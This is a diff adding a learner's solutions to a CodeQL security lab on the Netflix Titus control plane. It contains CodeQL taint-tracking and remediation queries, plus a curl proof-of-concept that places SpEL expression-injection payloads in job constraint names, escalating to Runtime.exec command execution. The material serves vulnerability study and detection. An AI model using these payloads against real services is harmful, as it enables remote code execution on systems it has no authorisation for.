@@ -541,3 +541,214 @@ from UnsafeErrorGeneration cfg, DataFlow::PathNode source, DataFlow::PathNode si
 where cfg.hasFlowPath(source, sink)
 select sink, source, sink, "Custom constraint error message contains unsanitized user data"
 ```
+
+## Step 3: Errors and Exceptions
+
+Since this sink is associated with generating error messages, there are many cases where they will be generated from an exception message in flows such as:
+
+```java
+try {
+    parse(tainted);
+} catch (Exception e) {
+    sink(e.getMessage())
+}
+```
+
+Our current query does not cover this case. An accurate taint step would require analyzing the implementation of the throwing method to determine if the tainted input is actually reflected in the exception message.
+
+Unfortunately, our CodeQL database identifies calls to library methods and their signatures, but does not have the source code of the implementations of those methods. So we need to model what they do. Write an additional taint step for these cases.
+
+**Note:**  In order to test your additional taint step, use quick evaluation on its  `step`  predicate to check if it detects the above pattern as you expect. Our current codebase doesn't contain cases of user-controlled beans flowing to these exception message pattern, so you won't be able to test your new taint step by running the whole query. Your query should continue to find only the same 2 results.
+
+**Hints:**
+
+-   Read the documentation for the classes  `TryStmt`  and  `CatchClause`  in the CodeQL Java library. Use jump-to-definition or hovers in the IDE to see their definition.
+-   You will have to restrict to  `CatchClause`s that write an exception by calling specific methods.
+-   Use a heuristic to decide which of those methods write error messages.
+- 
+## Step 3: Errors and Exceptions - Solution
+This is the step Im less sure about since I still have some doubts about my solution, Im looking forward for some feedback and can't wait to see the expected solution.
+
+```ql
+class CustomStepsTry extends TaintTracking::AdditionalTaintStep {
+    override predicate step(DataFlow::Node node1, DataFlow::Node node2) {
+        exists(TryStmt ts, MethodAccess parse, CatchClause cc, MethodAccess message|
+            //Get a parse method call inside a try clausule.
+            ts.getBlock() = parse.getEnclosingStmt().getEnclosingStmt() and
+            parse.getMethod().hasName("parse") and
+            //Set the first node as the arg 0 of parse.
+            node1.asExpr() = parse.getArgument(0) and
+            //Get a catch clausule of the try and check if it calls potential methods 
+            //that will return the first parameter of parse
+            ts.getACatchClause() = cc and
+            message.getBasicBlock() = cc and
+            (message.getMethod().hasName("getMessage") or
+            message.getMethod().hasName("getLocalizedMessage") or
+            message.getMethod().hasName("toString")
+            ) and
+            //Set the return of the method call as the node2
+            node2.asExpr() = message
+        ) 
+    }
+}
+```
+
+First the enclosing statement of a method access (parse) is extracted to see if it is inside of a try block, for method accesses where this is true the node1 is set to the first argument of the parse method.
+After this the catch clauses of the try are selected and if a method access to the methods `getMessage`, `getLocalizedMessage` or `toString` is performed inside any of this catch clauses the method access is marked as the node2
+
+Searching for other codebases with similar issues I found SpringXD, unfortunately the project is not longer maintained.
+https://github.com/spring-projects/spring-xd/blob/ec106725c51d245109b2e5055d9f65e43228ecc1/spring-xd-module-spi/src/main/java/org/springframework/xd/module/options/validation/CronExpression.java#L81
+
+The only difference is that in this case the node1 would be a constructor call instead of a MethodAccess.
+
+
+## Step 4: Exploit and remediation
+
+### Step 4.1: PoC
+Write a working PoC for it. You can use the official  [Docker images](https://github.com/Netflix/titus-control-plane/blob/master/docker-compose.yml).
+
+### Step 4.1: PoC - Solution
+To be able to write an exploit first we need to know where the validator is used, after some digging in the source code it can be seen that they are used in the properties softConstraints and hardConstraints of the Constainer class (https://github.com/Netflix/titus-control-plane/blob/d7012f6ada31e544117e1c85737bd09106686a1a/titus-api/src/main/java/com/netflix/titus/api/jobmanager/model/job/Container.java#L83)
+
+After some more digging of the api endpoints it was noted that a container object is provided by the user when a new job is created, so a request to create a job task was crafted (An example for this request can be found in the README of the Titus repository, but it needs some modification to contain constraints).
+
+The following curl request contains a constraint with the name `#{1+1}` the validator is not going to find this name in the list of constraints names and due to this an error containing our template name is going to be created by using `buildConstraintViolationWithTemplate`
+```curl
+curl --location --request POST 'localhost:7001/api/v3/jobs' \
+--header 'Content-Type: application/json' \
+--data-raw '{
+    "applicationName": "localtest",
+    "owner": {
+        "teamEmail": "me@me.com"
+    },
+    "container": {
+        "image": {
+            "name": "alpine",
+            "tag": "latest"
+        },
+        "entryPoint": [
+            "/bin/sleep",
+            "1h"
+        ],
+        "securityProfile": {
+            "iamRole": "test-role",
+            "securityGroups": [
+                "sg-test"
+            ]
+        },
+        "softConstraints": {
+            "constraints": {
+                "#{1+1}": "aa"
+            }
+        }
+    },
+    "batch": {
+        "size": 1,
+        "runtimeLimitSec": "3600",
+        "retryPolicy": {
+            "delayed": {
+                "delayMs": "1000",
+                "retries": 3
+            }
+        }
+    }
+}'
+```
+
+This should result in 
+```json
+{
+"statusCode": 400,
+"message": "Invalid Argument: {Validation failed: 'field: 'container.softConstraints', description: 'Unrecognized constraints [2]', type: 'HARD''}"
+}
+```
+
+At this point, more complex SpEL payloads can be crafted to execute arbitrary commands.
+
+*Advisory: has being a long time since I done something 'deep' with java so there are a lot of probably wrong assumptions here.*
+
+Testing some payloads I notice the error `"Unexpected error: HV000149: An exception occurred during message interpolation"`. So I decided to inspect the class name by using `"#{#this.class.name}"` as a key name, if you remember from previous paragraphs the validation occurs in the Container class, but instead of this we see the following `com.google.common.collect.SingletonImmutableBiMap`. Im not 100% sure about why this happens so I decides to debug by trial an error :)
+
+From our query we have two vulnerable `isValid` method, one is a validation of the key name against a list of keys and another one is a validation to see if keys are duplicated in the soft and hard constraints, so I decides to try and trigger the second one.
+
+this can be done adding a new line after the soft constrains with the following
+```json
+"softConstraints": {"constraints":{"#{#this.class.name}":"aa"}},
+"hardConstraints": {"constraints":{"#{#this.class.name}":"aa"}}
+```
+
+Resulting in the following message
+```json
+"Invalid Argument: {Validation failed: 'field: 'container.hardConstraints', description: '[+] Unrecognized constraints [com.google.common.collect.SingletonImmutableBiMap]', type: 'HARD''}, {Validation failed: 'field: 'container.softConstraints', description: '[+] Unrecognized constraints [com.google.common.collect.SingletonImmutableBiMap]', type: 'HARD''}, {Validation failed: 'field: 'container', description: 'Soft and hard constraints not unique. Shared constraints: [com.netflix.titus.api.jobmanager.model.job.Container]', type: 'HARD''}"
+```
+
+In this case we can see again the `com.google.common.collect.SingletonImmutableBiMap` but also the Container class `com.netflix.titus.api.jobmanager.model.job.Container`.
+
+So to prevent our payload from failing we can do the following
+
+```json
+"softConstraints": {"constraints":{"#{#this.class.name.substring(0,10) == 'com.google' ? 'FOO' : 'BAR'}":"aa"}},
+"hardConstraints": {"constraints":{"#{#this.class.name.substring(0,10) == 'com.google' ? 'FOO' : 'BAR'}":"aa"}}
+```
+
+Resulting in the following
+
+```
+"Invalid Argument: {Validation failed: 'field: 'container', description: 'Soft and hard constraints not unique. Shared constraints: [BAR]', type: 'HARD''}, {Validation failed: 'field: 'container.hardConstraints', description: '[+] Unrecognized constraints [foo]', type: 'HARD''}, {Validation failed: 'field: 'container.softConstraints', description: '[+] Unrecognized constraints [foo]', type: 'HARD''}"
+```
+
+Printing foo where the class is anything inside `com.google` and bar for anything else, the Container class in this case.
+
+Now we can replace bar for our payload.
+```json
+"softConstraints": {"constraints":{"#{#this.class.name.substring(0,10) == 'com.google' ? 'FOO' : T(java.lang.Runtime).getRuntime().exec('touch /tmp/test')}":"aa"}},
+"hardConstraints": {"constraints":{"#{#this.class.name.substring(0,10) == 'com.google' ? 'FOO' : T(java.lang.Runtime).getRuntime().exec('touch /tmp/test')}":"aa"}}
+```
+
+However this result in errors during interpolation.
+```
+"Unexpected error: HV000149: An exception occurred during message interpolation"
+```
+
+Again this is just a guess, but my thinking was that the output of this exec call can't be used as a valid value to build the final message so the interpolation fails, so what I did was calling class name in the exec call, the problem with this is that the execution is going to be completely blind.
+
+```json
+"softConstraints": {"constraints":{"#{#this.class.name.substring(0,10) == 'com.google' ? 'FOO' : T(java.lang.Runtime).getRuntime().exec('touch /tmp/test').class.name}":"aa"}},
+"hardConstraints": {"constraints":{"#{#this.class.name.substring(0,10) == 'com.google' ? 'FOO' : T(java.lang.Runtime).getRuntime().exec('touch /tmp/test').class.name}":"aa"}}
+```
+
+Resulting is something more promising
+```
+"Invalid Argument: {Validation failed: 'field: 'container.softConstraints', description: '[+] Unrecognized constraints [foo]', type: 'HARD''}, {Validation failed: 'field: 'container', description: 'Soft and hard constraints not unique. Shared constraints: [java.lang.UNIXProcess]', type: 'HARD''}, {Validation failed: 'field: 'container.hardConstraints', description: '[+] Unrecognized constraints [foo]', type: 'HARD''}"
+```
+
+
+Hopefully I did not wrote a lot of nonsense stuff, can't wait to see the solution to properly learn more about this.
+
+### Step 4.2: Remediation
+
+Download a  [database of the patched code](https://lgtm.com/projects/g/Netflix/titus-control-plane/ci/#ql), import it into VS Code, and run your query to verify that it no longer reports the issue.
+
+Our advisory contains other remediation techniques. Modify your query so it can be more precise or catch more variants of the vulnerability. For example, consider handling cases that disable the Java EL interpolation and only use  `ParameterMessageInterpolator`.
+
+### Step 4.2: Remediation - Solution
+A small predicate can be created to return true only if EL message interpolation has not been disabled so you can prevent false positives this way.
+
+```ql
+predicate isELInterpolationNotDisabled(){
+    not exists(MethodAccess ma, ConstructorCall cc |
+    ma.getMethod().hasName("messageInterpolator") and
+    cc.getConstructor().hasName("ParameterMessageInterpolator") and
+    ma.getArgument(0) = cc 
+    )
+}
+```
+
+Then this predicate can be used in the where clause of our query like this.
+```ql
+from UnsafeErrorGeneration cfg, DataFlow::PathNode source, DataFlow::PathNode sink
+where cfg.hasFlowPath(source, sink) and
+isELInterpolationNotDisabled()
+select sink, source, sink, "Custom constraint error message contains unsanitized user data"
+```
+
